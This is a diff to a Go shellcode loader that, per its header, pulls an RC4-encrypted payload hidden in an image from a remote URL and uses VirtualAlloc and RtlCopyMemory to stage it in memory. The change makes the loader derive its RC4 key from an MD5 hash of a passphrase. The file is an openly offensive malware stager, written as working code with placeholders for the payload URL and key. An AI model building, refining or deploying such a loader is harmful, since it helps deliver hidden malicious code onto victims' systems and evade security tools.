@@ -4,7 +4,7 @@
 //require: None
 //Description: load shellcode from img
 //E-mail: gality365@gmail.com
-
+// fix by yumusb
 package main
 
 import (
@@ -15,6 +15,8 @@ import (
 	"crypto/rc4"
 	"syscall"
 	"unsafe"
+	"crypto/md5"
+	"encoding/hex"
 )
 
 const (
@@ -31,11 +33,16 @@ var (
 	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
 	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
-
+func md5V(str string) string  {
+    h := md5.New()
+    h.Write([]byte(str))
+    return hex.EncodeToString(h.Sum(nil))
+}
 func main()  {
 	imageURL := "...your img url..."
-	rc4Key := []byte("...your RC4 key...")
-
+	rc4KeyPlain := "...your RC4 key..."
+	
+	rc4Key := []byte(md5V(rc4KeyPlain))
 	resp, err := http.Get(imageURL)
 	if err != nil {
 		os.Exit(1)
